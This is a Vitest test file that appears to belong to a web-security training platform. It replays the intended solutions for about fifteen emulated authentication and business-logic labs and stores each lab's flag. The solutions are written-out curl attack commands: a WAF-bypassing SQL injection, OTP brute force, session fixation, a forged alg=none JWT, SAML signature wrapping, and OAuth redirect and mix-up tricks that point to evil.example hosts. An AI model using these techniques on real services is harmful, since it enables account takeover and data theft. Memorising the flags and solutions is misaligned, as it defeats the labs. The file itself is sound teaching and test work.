import { describe, it, expect } from 'vitest'
import fs from 'node:fs'
import path from 'node:path'
import { createSession } from './session'

// End-to-end solvability check for the web AUTH / LOGIC lab batch: loads the
// REAL fixture bundle from content/labs, replays the intended solution with the
// emulated tools, and asserts `check` passes. If a lab stops being solvable in
// the engine, this fails.
const dir = path.resolve(process.cwd(), '../content/labs')
const WD = '/home/student/task'
const CHECK = "grep -q 'nto{' found.txt"

function load(id) {
  return JSON.parse(fs.readFileSync(path.join(dir, `${id}.json`), 'utf8'))
}

const LABS = [
  {
    id: 'web-logic-races', flag: 'nto{r4c3_0v3rrun_0n3_p4ck3t}', hints: 4,
    solution: [
      `curl -s --parallel -X POST 'http://shop.local/cart/coupon?code=SAVE10&burst=20' | tail -1 > found.txt`,
    ],
  },
  {
    id: 'web-logic-core', flag: 'nto{c4ptch4_sk1pp3d_w1th0ut_p4r4m}', hints: 4,
    solution: [
      `curl -s -X POST https://shop.local/register -d 'user=admin&pass=x' | tail -1 > found.txt`,
    ],
  },
  {
    id: 'web-logic-bypass-chains', flag: 'nto{w4f_p4rs3r_d1s4gr33m3nt_un10n}', hints: 4,
    solution: [
      `curl -s 'https://shop.local/api/user?id=1/*!50000UNION*/SELECT%20pass%20FROM%20users' | tail -1 > found.txt`,
    ],
  },
  {
    id: 'web-business-logic-advanced', flag: 'nto{w0rkfl0w_byp4ss_sk1pp3d_p4ym3nt}', hints: 4,
    solution: [
      `curl -s -X POST https://shop.local/api/checkout/confirm -H 'Cookie: session=me' -d 'cart_id=c1' | tail -1 > found.txt`,
    ],
  },
  {
    id: 'web-captcha-bypass', flag: 'nto{c4ptch4_r3us3_brut3f0rc3_0tp}', hints: 4,
    solution: [
      `curl -s --parallel 'https://shop.local/login/otp?captcha_id=c_88f1&captcha=4f7k2&otp=0000..9999&burst=100' | tail -1 > found.txt`,
    ],
  },
  {
    id: 'web-cookies-sessions', flag: 'nto{s3ss10n_f1x4t10n_t4k30v3r}', hints: 4,
    solution: [
      `curl -s -i https://shop.local/ -c jar.txt`,
      `curl -s -i -b 'session=attacker_fixed_id' -X POST https://shop.local/login -d 'username=admin&password=admin'`,
      `curl -s -b 'session=attacker_fixed_id' https://shop.local/account | tail -1 > found.txt`,
    ],
  },
  {
    id: 'web-auth-core', flag: 'nto{1d0r_b0l4_br34ks_th3_b0und4ry}', hints: 4,
    solution: [
      `curl -s -b cookies.txt https://shop.local/api/v1/users/1 | tail -1 > found.txt`,
    ],
  },
  {
    id: 'web-auth-bypass', flag: 'nto{mf4_st4t3_c00k13_t4mp3r3d}', hints: 4,
    solution: [
      `curl -s -i -c c.txt -d 'user=alice&pass=alice123' https://shop.local/login`,
      `curl -s 'https://shop.local/login/mfa/complete' -b 'session=8f2a11c0; mfa=1' | tail -1 > found.txt`,
    ],
  },
  {
    id: 'web-auth-jwt-idor', flag: 'nto{jwt_4lg_n0n3_1d0r_4dm1n}', hints: 4,
    solution: [
      `export H=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0=`,
      `export P=eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0=`,
      `curl -s https://shop.local/api/orders/1002 -H "Authorization: Bearer $H.$P." | tail -1 > found.txt`,
    ],
  },
  {
    id: 'web-auth-protocols', flag: 'nto{r3fr3sh_t0k3n_r3pl4y_4ft3r_l0g0ut}', hints: 4,
    solution: [
      `curl -s https://shop.local/api/logout -H 'Authorization: Bearer x'`,
      `curl -s -d 'grant_type=refresh_token&refresh_token=rt_9f2a11c0' https://shop.local/api/token | tail -1 > found.txt`,
    ],
  },
  {
    id: 'web-oauth-device-code', flag: 'nto{d3v1c3_c0d3_ph1sh1ng_t0k3n_st34l}', hints: 4,
    solution: [
      `curl -s https://acmeid.example/device/code -d 'client_id=shop-tv&scope=openid'`,
      `curl -s 'https://acmeid.example/device/approve?user_code=WDJB-MJHT&device_code=GmRhmhcxhwAzkoEqiMEg' | tail -1 > found.txt`,
    ],
  },
  {
    id: 'web-saml-deep', flag: 'nto{s4ml_xsw_s1gn4tur3_wr4pp3d}', hints: 4,
    solution: [
      `cat saml_b64.txt | base64 -d`,
      `base64 -w0 evil_saml.xml > evil.b64`,
      `curl -s -X POST 'https://shop.local/saml/acs' --data-binary @evil.b64 | tail -1 > found.txt`,
    ],
  },
  {
    id: 'web-sso-mixup', flag: 'nto{0auth_m1xup_c0d3_c0nfus10n}', hints: 4,
    solution: [
      `curl -s -i 'https://shop.local/login?provider=acmeid'`,
      `curl -s 'https://shop.local/cb?code=CODE_FROM_CORP&idp=evil.example' | tail -1 > found.txt`,
    ],
  },
  {
    id: 'web-oauth-oidc-saml', flag: 'nto{r3d1r3ct_ur1_pr3f1x_byp4ss}', hints: 4,
    solution: [
      `curl -s -i 'https://acmeid.example/authorize?response_type=code&client_id=shop&redirect_uri=https://shop.local/oauth/callback&state=xyz123'`,
      `curl -s -i 'https://acmeid.example/authorize?response_type=code&client_id=shop&redirect_uri=https://shop.local.evil.com/callback&state=xyz123' | tail -1 > found.txt`,
    ],
  },
  {
    id: 'web-session-puzzling', flag: 'nto{s3ss10n_puzzl1ng_cr0ss_fl0w}', hints: 4,
    solution: [
      `curl -s -c jar -X POST https://t/register/step1 -d 'email=attacker@x.com'`,
      `curl -s -b jar -c jar -X POST https://t/forgot -d 'email=victim@corp.com'`,
      `curl -s -b jar -X POST https://t/register/step2 -d 'password=Pwn1!' | tail -1 > found.txt`,
    ],
  },
]

describe.each(LABS)('web auth lab: $id', ({ id, flag, hints, solution, check }) => {
  const bundle = load(id)
  const spec = { kind: 'shell', workdir: WD, check: check || CHECK, hints: Array(hints).fill('h') }

  it('bundle + seed files are consistent with the lesson lab block', () => {
    expect(bundle.id).toBe(id)
    expect(bundle.workdir).toBe(WD)
    expect(bundle.fs.some((f) => f.path === `${WD}/task.md`)).toBe(true)
    expect(bundle.expect.file).toBe(`${WD}/found.txt`)
    expect(bundle.expect.contains).toBe(flag)
  })

  it('replays the intended solution and passes check', async () => {
    const s = createSession({ spec, bundle })
    expect((await s.run('check')).code).toBe(1) // not solved yet
    for (const cmd of solution) await s.run(cmd)
    const r = await s.run('check')
    expect(r.code).toBe(0)
    expect(r.stdout).toContain('Готово')
    expect(s.solved).toBe(true)
    expect(s.vfs.readText(`${WD}/found.txt`)).toContain(flag)
  })

  it('hints are progressive and never contain the full flag', () => {
    for (const h of spec.hints) expect(h).not.toContain(flag)
  })
})
